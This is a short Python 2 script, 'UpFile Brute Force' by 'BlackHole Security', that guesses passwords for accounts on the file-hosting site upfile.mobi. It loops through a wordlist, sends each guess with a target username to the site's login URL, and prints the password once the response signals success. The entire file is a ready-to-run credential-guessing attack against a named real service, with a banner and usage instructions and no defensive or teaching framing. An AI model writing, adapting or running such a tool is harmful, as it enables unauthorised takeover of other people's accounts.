## upfilebf - Upfile Brute Force
# -*- coding: utf-8 -*-
##
import sys
import urllib2
import threading

__date__ = "21-May-2018"
__author__ = "DedSecTL/DTL"
__team__ = "BlackHole Security"
__codename__ = "Alone."
__banner__ = """
################################################
#              UpFile Brute Force              #
#              BlackHole Security              #
#               21 - May - 2018                #
################################################
"""

def upfilebf(username, wordlist):
	for passwd in open(wordlist, 'r').read().split():
		response = urllib2.urlopen("http://upfile.mobi/?page=login&u="+username+"&p="+passwd).read()
		if "successfully" in response:
			print "[+] Password:",passwd,"is correct"
			break
		else:
			print "[-] Password:",passwd,"is incorrect"
			pass

if __name__ == "__main__":
	print __banner__
	if len(sys.argv) != 3:
		print "Usage: upfilebf username wordlist.txt"
	else:
		t = threading.Thread(target=upfilebf, args=(sys.argv[1], sys.argv[2]))
		t.start()